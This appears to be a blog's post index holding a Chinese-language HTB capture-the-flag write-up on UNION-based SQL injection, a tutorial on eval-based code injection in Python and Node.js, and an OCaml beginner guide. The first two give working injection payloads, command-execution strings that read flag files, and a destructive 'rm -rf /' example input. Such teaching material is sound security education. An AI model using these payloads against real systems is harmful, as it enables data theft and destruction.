Writeup","slug":"CTF/Web/HTB-Unholy_Union-Writeup","date":"2025-05-31T08:25:27.000Z","updated":"2025-05-31T08:45:33.538Z","comments":true,"path":"2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","excerpt":"","text":"题目描述 观察打开网页： 随便尝试输入点内容会发现 搜索的语句是 1SELECT * FROM inventory WHERE name LIKE &#x27;%1%&#x27; 所有尝试输入 1&#x27; OR 1=1 -- - 会发现可以注入成功。 注意，在MySQL/MariaDB中，如果 -- 后紧跟 %，它 不会被识别为注释符，而是视作 --%，导致SQL语法错误。所以我们这里注入时需要在--后面加上空格以及一个任意符号/字母/数字（比如说-）。 也就是说这道题的注入格式为 1&#x27; injection_code -- - 并且注意到当前的表格一共有5列内容。 渗透由于在当前表格里没有找到flag相关的内容，所以我们先查看当前所有的表格信息： 1&#x27; UNION SELECT null, table_name, null, null,null FROM information_schema.tables WHERE table_schema=database() -- - 发现有一个名为flag的表格。那么现在来查看一下这个表格有哪些列： 1&#x27; UNION SELECT column_name, null,null,null, null FROM information_schema.columns WHERE table_name=&#x27;flag&#x27; -- - 发现只有一列内容，并且这列的名字也叫flag。接着查看这列的具体内容即可得到flag： 1&#x27; UNION SELECT flag,null,null,null,null from flag -- - 1HTB&#123;un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/en/tags/SQL/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"}]},{"title":"动态代码执行函数漏洞","slug":"CTF/Web/动态代码执行函数漏洞","date":"2025-05-24T22:21:08.000Z","updated":"2025-05-25T16:22:58.779Z","comments":true,"path":"2025/05/25/CTF/Web/动态代码执行函数漏洞/","permalink":"https://archer-baiyi.github.io/en/2025/05/25/CTF/Web/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/","excerpt":"各种编程语言中的动态代码执行函数的安全风险","text":"动态代码执行函数在编程语言中，动态代码执行是指在程序运行时，根据接收到的字符串动态地将其当作代码来执行。虽然这种功能在某些场景下非常灵活（例如动态生成代码、运行用户输入），但它也带来了巨大的安全隐患。攻击者可以通过恶意输入注入代码，进而控制系统或窃取敏感信息。 我们下面看一下不同语言（如 Python、PHP、JavaScript）中常用的动态代码执行函数及其风险。 Pythoneval()用途：eval() 会将传入的字符串当作 Python 表达式来执行。 安全隐患：如果用户输入未经验证的字符串传给 eval()，攻击者可以执行任意代码。 例子： 123result = eval(input(&quot;Enter a math expression: &quot;))print(result) 那么当我们输入 1os.system(&#x27;rm -rf /&#x27;) 时会导致删除系统文件。 Payload： 1234567891011121314151617181920212223open(&#x27;flag.txt&#x27;).read()__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)&quot;)getattr(__import__(&#x27;os&#x27;), &#x27;system&#x27;)(&#x27;cat flag.txt&#x27;)__import__(&#x27;builtins&#x27;).open(&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].__dict__[&#x27;open&#x27;](&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].open(&#x27;flag.txt&#x27;).read()__import__(&#x27;subprocess&#x27;).check_output([&#x27;cat&#x27;, &#x27;flag.txt&#x27;])__import__(&#x27;sh&#x27;).cat(&#x27;flag.txt&#x27;) # 需要安装了sh库sh.cat(&#x27;flag.txt&#x27;) # 需要安装了sh库 （看情况在flag.txt前面加上/或者../） 也可以利用breakpoint()（Python3.7+ 中的调试工具，可以直接启动交互式调试器（比如 pdb））： 123breakpoint()# 然后在pdb的提示符出来后输入!print(open(&quot;flag.txt&quot;).read()) ! 会让 pdb 执行一条普通 Python 语句。 特殊情况也可以使用： 1234eval(input(&quot;Enter: &quot;))#然后输入__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) 注意，这里的第一行代码的eval()是额外输入的，并不是指程序原本的。这点非常重要，不多输入一个eval()会失败。区别： 12345678&gt;&gt; eval(input(&quot;Enter: &quot;))Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)flag&#123;fake_flag&#125;eval(input(&quot;Enter: &quot;)) --&gt; 0&gt;&gt; input(&quot;Enter: &quot;)Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)input(&quot;Enter: &quot;) --&gt; __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) exec()compile()相比前两个会安全很多。 例子： 123user_input = &quot;os.system(&#x27;rm -rf /&#x27;)&quot; # 恶意输入code = compile(user_input, &quot;&lt;string&gt;&quot;, &quot;exec&quot;)exec(code) # 执行了恶意代码 因为只有当我们能通过输入控制compile()的三个参数时才可以进行RCE攻击。 PHPeval()JavaScripteval()例子： 12345678910111213141516171819202122router.post(&#x27;/api/calculate&#x27;, (req, res) =&gt; &#123; let &#123; formula &#125; = req.body; if (formula) &#123; result = Calculator.calculate(formula); return res.send(response(result)); &#125; return res.send(response(&#x27;Missing parameters&#x27;));&#125;);module.exports = &#123; calculate: function(formula) &#123; try &#123; return eval(`(function() &#123; return $&#123;formula&#125;; &#125;)()`); // 漏洞所在 &#125; catch (e) &#123; if (e instanceof SyntaxError) &#123; return &#x27;Something went wrong!&#x27;; &#125; &#125; &#125;&#125;; 所以当输入 1global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag.txt&#x27;).toString() 时可以成功读取flag。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/en/tags/Python/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/en/tags/JavaScript/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/en/tags/PHP/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/en/tags/eval/"}]},{"title":"Ocaml 入门","slug":"编程/Ocaml-入门","date":"2025-05-22T14:25:04.000Z","updated":"2025-10-09T20:24:54.472Z","comments":true,"path":"2025/05/22/编程/Ocaml-入门/","permalink":"https://archer-baiyi.github.io/en/2025/05/22/%E7%BC%96%E7%A8%8B/Ocaml-%E5%85%A5%E9%97%A8/","excerpt":"","text":"OCaml 是一种支持函数式、命令式和面向对象编程范式的静态类型语言。 下载建议在MacOS，Linux(WSL)系统上运行Ocaml。 依次运行以下命令即可下载Ocaml及其相关工具： Linux： 1234567891011121314151617181920# 1. 更新系统包索引sudo apt update# 2. 安装 opam（OCaml 的包管理器）sudo apt install opam -y# 3. 初始化 opam（首次运行会创建配置文件）opam init -y --bare# 4. 加载 opam 环境变量（将 ocaml 等命令加入 PATH）eval $(opam env)# 5. 创建指定版本的 OCaml 编译环境（这里是 4.14.1）opam switch create 4.14.1# 6. 再次加载 opam 环境（进入新 switch）eval $(opam env)# 7. 安装配套工具（dune 构建工具，utop REPL，ocaml-lsp-server 语言服务）opam install -y dune utop ocaml-lsp-server MacOS： 123456789101112131415161718192021# 0. 安装 Homebrew（如果已经安装可以跳过）/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;brew update# 1. 安装 OCaml 和 OPAM（OCaml 的官方包管理工具）brew install ocaml opam# 2. 初始化 OPAM（第一次使用时必须）opam initeval $(opam env)# 3. 创建一个新的 OCaml 编译器环境（可指定版本）opam switch create 4.14.1eval $(opam env)# 4. 安装 utop（更好的 OCaml REPL 工具）opam install utopeval $(opam env)# 5. 启动 utop 测试utop 其中utop 是 OCaml 的一个增强型交互式命令行（REPL），提供语法高亮、自动补全和更友好的开发体验： 在utop中： # 表示Interpreter在等待输入（input）； ;; 用于标志一个表达式的结束，告诉解释器可以开始执行（跟C语言中的;一样）； - 则表示输出的结果 关于自动补全的部分，可以使用Alt+Left以及Alt+Right来选择，然后使用Alt+Down进行确认。（这里的Left, Right, Down指的是键盘上的方向键。） 在后续内容中我们会utop的格式来区分代码以及结果。 更新12345678# 1.确认是通过 opam 管理的 OCamlopam --version# 2. 用 opam 安装 OCaml 5.3opam updateopam upgradeopam switch create 5.3.0 ocaml-base-compiler.5.3.0 验证： 12$ ocaml -versionThe OCaml toplevel, version 5.3.0 然后需要重新安装utop： 1opam install utop 验证：12utop # Sys.ocaml_version;;- : string = &quot;5.3.0&quot; BasicsHello World12# print_string &quot;Hello World!&quot;;;Hello World!- : unit = () 定义变量使用let： 12345# let seven = 3+4;;val seven : int = 7# seven;;- : int = 7 变量名的开头需为小写字母。 也可以定义tuple： 123let (x,y) = (3,4.0)let (_,y) = (3,4) _表示anaonymous variable。 Records在 OCaml 中，记录（records）是一种 静态、固定字段名 的数据结构，类似于 C 语言的 struct 或 Python 的类实例。 字段名和类型在定义时就固定了，不能动态添加或删除。 跟字典不一样。 12345678910type person = &#123;given:string; sur:string; age:int&#125;let paul = &#123; given=&quot;Paul&quot;; sur=&quot;Meier&quot;; age=24 &#125;let hans = &#123; sur=&quot;kohl&quot;; age=23; given=&quot;hans&quot;&#125;let hansi = &#123;age=23; sur=&quot;kohl&quot;; given=&quot;hans&quot;&#125;# hans = hansi;;- : bool = true 利用component的名字来访问，比如说 12# paul.given;;- : string = &quot;Paul&quot; 或者利用pattern matching 1234# let &#123;given = x;sur = y; age = z&#125; = paul;;val x : string = &quot;Paul&quot;val ny : string = &quot;Meier&quot;val z : int = 24 12# let &#123;given = x;_&#125; = paul;;val x : string = &quot;Paul&quot; Lists 列表使用[]和::构造列表： 1234567891011# let mt = [];;val mt : &#x27;a list = []# let l1 = 1::mt;;val l1 : int list = [1]# let l = [1;2;3];;val l : int list = [1; 2; 3]# let l = 1::2::3::[];;val l : int list = [1; 2; 3] 注意，列表里的所有元素都需要是同一个type的。 我们可以针对一个列表进行pattern matching: 123456# match lwith [] -&gt; -1| x::xs -&gt; x;;-: int = 1 其中x指的是当前列表中的第一个元素，而xs是所有剩余的元素。 在 OCaml 里，:: 是 列表拆分（cons）运算符，模式的语法是： 1head::tail head部分默认是列表的第一个元素，tail则是剩余。（这里的变量名无关紧要，x::xs, head::tail的效果是完全一样的） Case Distinction 分类讨论使用match和if： 12345match n with | 0 -&gt; &quot;null&quot; | 1 -&gt; &quot;one&quot; | _ -&gt; &quot;uncountable!&quot; 123match e with| true -&gt; e1| false -&gt; e2 第二个也可以写成 1if e then e1 else e2 可以把Ocaml里的match理解成一个分段函数，将不同的定义域上的值映射到其他值上。 也可以把match理解成if, else，其中_为else。 定义类型（Type）定义Tuple的数据类型： 123type vector3 = float*float*float;;let p1: vector3 = (1.0,1.0,1.0);; 错误示例： 123type vector3 = (x1:float; x2:float; x3:float);;let p1 = vector3(1.0,1.0,1.0);; 12345678910type student = &#123; first_name : string; last_name : string; id : int; semester : int; grades : (int * float) list;&#125;type database = student list 数据类型转换123string_of_floatstring_of_int... 函数同样使用let来定义函数：（所以在Ocaml里可以把函数理解成变量） 12345# let double x = 2 * x;;val double : int -&gt; int = &lt;fun&gt;# (double 3, douoble (double 1));;- : int * int = (6,4) 也可以写成 12# let double = fun x -&gt; 2*x;;val double : int -&gt; int = &lt;fun&gt; 用fun来强调一下这里定义的是一个函数。 不过要注意一点，如果在定义函数时用到了一个之前定义的变量，那么在定义完函数之后修改这个变量并不会修改这个函数的操作。 1234567891011# let factor = 2;;val factor : int = 2# let double x = factor * x;;val double : int -&gt; int = &lt;fun&gt;# let factor = 4;;val factor : int = 4# double 3;;- : int = 6 注意到这里的结果是6（$2\\cdot3$）而不是12（$4\\cdot3$）。 函数类型先看这个例子： 123type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a listfold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a （这个函数的具体功能后面会讲。） 根据type的定义，它等于： 1fold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b list -&gt; &#x27;a 这样理解： 这个函数会接收三个参数作为输入，并返回一个输出。输入的内容的公式分别为： (&#39;a -&gt; &#39;b -&gt; &#39;a)：一个函数，接收2个输入，返回一个输出。输出的数据类型与输入的第一个参数的数据类型相同； &#39;a：一个任意类型的数据； &#39;b list：一个任意数据类型的列表； 而输出的数据类型为&#39;a，与第二个参数相同。 Recursive Functions 递归函数使用rec： 12345678# let rec fac n = if n &lt; 2 then 1 else n * fac (n-1);;val fac : int -&gt; int = &lt;fun&gt;# let rec fib = fun x -&gt; if x &lt;=1 then 1else fib (x-1) + fib (x-2);;val fib : int -&gt; int = &lt;fun&gt; 想要几个新定义的函数交叉引用递归的话则需要用and连接： 123456789# let rec even n = if n=0 then &quot;even&quot;else odd (n-1)and odd n = if n=0 then &quot;odd&quot;else ecen (n-1);;val even : int -&gt; string = &lt;fun&gt;val odd : int -&gt; string = &lt;fun&gt; 使用Case Distinction来定义函数12345678# let rec length = fun l -&gt; match l with| [] -&gt; 0| x:xs -&gt; 1 + length xs;;val length : &#x27;a list -&gt; int = &lt;fun&gt;# length [1;2;3];;- : int = 3 也可以写成 12345678# let rec length = function| [] -&gt; 0| x:xs -&gt; 1 + length xs;;val length : &#x27;a list -&gt; int = &lt;fun&gt;# length [1;2;3];;- : int = 3 Local Definitions可以使用let或者let rec定义一个局部变量（不过需要配合in一起使用）： 123456789101112# let x = 5 inlet sq = x*x insq + sq;;- : int = 50# let facin n = let rec iter m yet = if m &gt; n then yet else iter (m+1) (m*yet) in iter 2 1;;val facit : int -&gt; int = &lt;fun&gt; 在facin的例子里，我们相当于在定义facin这个函数时定义并调用了一个新函数（iter）。 Tail Recursive 尾递归我们拿阶乘来举例子，正常的是这么写递归： 123let rec fac n =if n &lt;= 1 then 1else n * fac (n-1);; 这样子的计算逻辑便是： 1234fac 5= 5 * fac 4= 5 * (4 * fac 3)= ... 每次都需要递归下去直到得到fac 1的结果了之后再一层一层地乘回来，这样会导致所需的栈空间非常大。 而尾递归的写法则是： 123456let fac x = let rec facit n acc = if n &lt;= 1 then acc else facit (n - 1) (n * acc) in facit x 1 这样的流程则变成了： 1facit 5 1 → facit 4 5 → facit 3 20 → facit 2 60 → facit 1 120 → 返回 120 相当于是一条路走下去。 用汇编的角度来理解就是，普通的情况需要一直call，但是尾递归的写法就只需要jump了。 再来多看些例子： 列表长度普通递归： 12345let rec length lst = match lst with | [] -&gt; 0 | _ :: t -&gt; 1 + length t 尾递归： 1234567let length lst = let rec aux lst len = match lst with [] -&gt; len |_::t -&gt; aux t (len+1) in aux lst 0;; 列表反转普通递归： 1234let rec rev lst = match lst with | [] -&gt; [] | h :: t -&gt; (rev t) @ [h] 尾递归： 1234567let rev lst = let rec aux lst l = match lst with [] -&gt; l |x::xs -&gt; aux xs (x::l) in aux lst [];; 列表映射普通递归： 1234let rec map f lst = match lst with | [] -&gt; [] | h :: t -&gt; (f h) :: (map f t) 尾递归： 1234567let map f lst = let rec aux f lst l = match lst with []-&gt; List.rev l |x::xs -&gt; aux f xs ((f x)::l) in aux f lst [];; 计算树的和树的Type定义 1type tree = | Leaf of int | Node of int * tree * tree 普通递归： 123let rec sum_tree t = match t with | Leaf n -&gt; n | Node(n, left, right) -&gt; n + sum_tree left + sum_tree right 尾递归： 12345678let sum_tree t =let rec aux s l =match l with[] -&gt; s|Leaf n :: xs -&gt; aux (s+n) xs|Node(n,left,right)::xs -&gt; aux (s+n) (left::right::xs)inaux 0 [t];; 核心思路：将left和right tree全都添加进一个列表里，等后续慢慢处理。 总结一下如何快速判断一个函数是否是尾递归的： 如果在调用它时，需要利用其结果再进行任何计算，那都属于非尾递归，比如说 123n * fac (n-1)n + sum_tree left + sum_tree right 而如果调用时干净利落，前后没有跟任何多余的东西，则属于尾递归，比如说： 123facit (n - 1) (n * acc)aux (s+n) (left::right::xs) List函数先看一下全部的签名（4.14.1版本下的）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# #show List;;module List : sig type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a list val length : &#x27;a t -&gt; int val compare_lengths : &#x27;a t -&gt; &#x27;b t -&gt; int val compare_length_with : &#x27;a t -&gt; int -&gt; int val cons : &#x27;a -&gt; &#x27;a t -&gt; &#x27;a t val hd : &#x27;a t -&gt; &#x27;a val tl : &#x27;a t -&gt; &#x27;a t val nth : &#x27;a t -&gt; int -&gt; &#x27;a val nth_opt : &#x27;a t -&gt; int -&gt; &#x27;a option val rev : &#x27;a t -&gt; &#x27;a t val init : int -&gt; (int -&gt; &#x27;a) -&gt; &#x27;a t val append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val rev_append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val concat : &#x27;a t t -&gt; &#x27;a t val flatten : &#x27;a t t -&gt; &#x27;a t val equal : (&#x27;a -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; bool val compare : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; int val iter : (&#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val iteri : (int -&gt; &#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val mapi : (int -&gt; &#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val rev_map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val filter_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b t val concat_map : (&#x27;a -&gt; &#x27;b t) -&gt; &#x27;a t -&gt; &#x27;b t val fold_left_map : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a * &#x27;c) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a * &#x27;c t val fold_left : (&#x27;a -&gt; &#x27;b -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;a val fold_right : (&#x27;a -&gt; &#x27;b -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b -&gt; &#x27;b val iter2 : (&#x27;a -&gt; &#x27;b -&gt; unit) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; unit val map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val rev_map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val fold_left2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c -&gt; &#x27;a) -&gt; &#x27;a -&gt; &#x27;b t -&gt; &#x27;c t -&gt; &#x27;a val fold_right2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c -&gt; &#x27;c val for_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val exists : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val for_all2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val exists2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val mem : &#x27;a -&gt; &#x27;a t -&gt; bool val memq : &#x27;a -&gt; &#x27;a t -&gt; bool val find : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a val find_opt : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a option val find_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val filter : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val find_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val filteri : (int -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val partition : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t * &#x27;a t val partition_map : (&#x27;a -&gt; (&#x27;b, &#x27;c) Either.t) -&gt; &#x27;a t -&gt; &#x27;b t * &#x27;c t val assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assoc_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assq_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val mem_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val mem_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val remove_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val remove_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val split : (&#x27;a * &#x27;b) t -&gt; &#x27;a t * &#x27;b t val combine : &#x27;a t -&gt; &#x27;b t -&gt; (&#x27;a * &#x27;b) t val sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val stable_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val fast_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val sort_uniq : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val merge : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val to_seq : &#x27;a t -&gt; &#x27;a Seq.t val of_seq : &#x27;a Seq.t -&gt; &#x27;a t end 5.3.0版本下的全部的签名： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576utop # #show List;;module List : sig type &#x27;a t = &#x27;a list = [] | (::) of &#x27;a * &#x27;a list val length : &#x27;a t -&gt; int val compare_lengths : &#x27;a t -&gt; &#x27;b t -&gt; int val compare_length_with : &#x27;a t -&gt; int -&gt; int val is_empty : &#x27;a t -&gt; bool val cons : &#x27;a -&gt; &#x27;a t -&gt; &#x27;a t val hd : &#x27;a t -&gt; &#x27;a val tl : &#x27;a t -&gt; &#x27;a t val nth : &#x27;a t -&gt; int -&gt; &#x27;a val nth_opt : &#x27;a t -&gt; int -&gt; &#x27;a option val rev : &#x27;a t -&gt; &#x27;a t val init : int -&gt; (int -&gt; &#x27;a) -&gt; &#x27;a t val append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val rev_append : &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val concat : &#x27;a t t -&gt; &#x27;a t val flatten : &#x27;a t t -&gt; &#x27;a t val equal : (&#x27;a -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; bool val compare : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; int val iter : (&#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val iteri : (int -&gt; &#x27;a -&gt; unit) -&gt; &#x27;a t -&gt; unit val map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val mapi : (int -&gt; &#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val rev_map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a t -&gt; &#x27;b t val filter_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b t val concat_map : (&#x27;a -&gt; &#x27;b t) -&gt; &#x27;a t -&gt; &#x27;b t val fold_left_map : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;acc * &#x27;b) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;acc * &#x27;b t val fold_left : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;acc) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;acc val fold_right : (&#x27;a -&gt; &#x27;acc -&gt; &#x27;acc) -&gt; &#x27;a t -&gt; &#x27;acc -&gt; &#x27;acc val iter2 : (&#x27;a -&gt; &#x27;b -&gt; unit) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; unit val map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val rev_map2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;c) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;c t val fold_left2 : (&#x27;acc -&gt; &#x27;a -&gt; &#x27;b -&gt; &#x27;acc) -&gt; &#x27;acc -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;acc val fold_right2 : (&#x27;a -&gt; &#x27;b -&gt; &#x27;acc -&gt; &#x27;acc) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; &#x27;acc -&gt; &#x27;acc val for_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val exists : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; bool val for_all2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val exists2 : (&#x27;a -&gt; &#x27;b -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;b t -&gt; bool val mem : &#x27;a -&gt; &#x27;a t -&gt; bool val memq : &#x27;a -&gt; &#x27;a t -&gt; bool val find : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a val find_opt : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a option val find_index : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; int option val find_map : (&#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val find_mapi : (int -&gt; &#x27;a -&gt; &#x27;b option) -&gt; &#x27;a t -&gt; &#x27;b option val filter : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val find_all : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val filteri : (int -&gt; &#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val take : int -&gt; &#x27;a t -&gt; &#x27;a t val drop : int -&gt; &#x27;a t -&gt; &#x27;a t val take_while : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val drop_while : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t val partition : (&#x27;a -&gt; bool) -&gt; &#x27;a t -&gt; &#x27;a t * &#x27;a t val partition_map : (&#x27;a -&gt; (&#x27;b, &#x27;c) Either.t) -&gt; &#x27;a t -&gt; &#x27;b t * &#x27;c t val assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assoc_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b val assq_opt : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; &#x27;b option val mem_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val mem_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; bool val remove_assoc : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val remove_assq : &#x27;a -&gt; (&#x27;a * &#x27;b) t -&gt; (&#x27;a * &#x27;b) t val split : (&#x27;a * &#x27;b) t -&gt; &#x27;a t * &#x27;b t val combine : &#x27;a t -&gt; &#x27;b t -&gt; (&#x27;a * &#x27;b) t val sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val stable_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val fast_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val sort_uniq : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val merge : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val to_seq : &#x27;a t -&gt; &#x27;a Seq.t val of_seq : &#x27;a Seq.t -&gt; &#x27;a t end List.fold_left语法： 1List.fold_left f acc lst f：是一个“累积函数”，定义如何处理当前元素和累积值。 它的类型是 (&#39;a -&gt; &#39;b -&gt; &#39;a)，即接收当前累积值和当前元素，返回新的累积值。 acc：是初始累积值。 